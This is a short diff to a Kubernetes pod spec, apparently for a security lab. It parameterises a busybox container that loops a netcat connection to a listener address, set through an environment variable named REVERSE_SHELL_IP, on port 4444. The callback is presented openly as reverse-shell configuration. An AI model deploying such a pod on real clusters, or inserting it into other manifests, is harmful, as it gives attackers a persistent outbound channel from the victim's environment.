@@ -9,10 +9,13 @@ spec:
   containers:
     - name: shell
       image: docker.io/library/busybox:latest
+      env:
+        - name: REVERSE_SHELL_IP
+          value: "10.0.2.15"  # Change this IP to match your lab environment
       command: ["/bin/sh", "-c"]
       args:
         - >
           while true; do
-            nc 10.0.2.15 4444;
+            nc $REVERSE_SHELL_IP 4444;
             sleep 10;
           done
